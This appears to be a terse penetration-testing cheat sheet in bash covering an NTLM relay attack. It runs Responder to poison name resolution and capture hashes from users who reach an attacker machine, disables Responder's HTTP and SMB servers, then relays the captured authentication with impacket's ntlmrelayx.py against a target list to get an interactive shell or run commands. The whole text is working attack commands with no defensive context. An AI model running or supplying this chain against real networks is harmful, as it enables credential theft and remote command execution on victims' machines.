```bash
└─$ sudo responder -I eth0 -Fdwv #poisoning authorization and get hash when someone go to address \\ATACKER_MACHINE

-----------------------------------------------------------------------
nano /etc/responder/Responder.con #and off the http and smb
└─$ sudo responder -I eth0 -Fwdv
└─$ sudo /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf targets.lst -smb2support #use -i to interactive shell or -c for command enter like "id"
then rut and ask for connection from user to your attacker host smb

```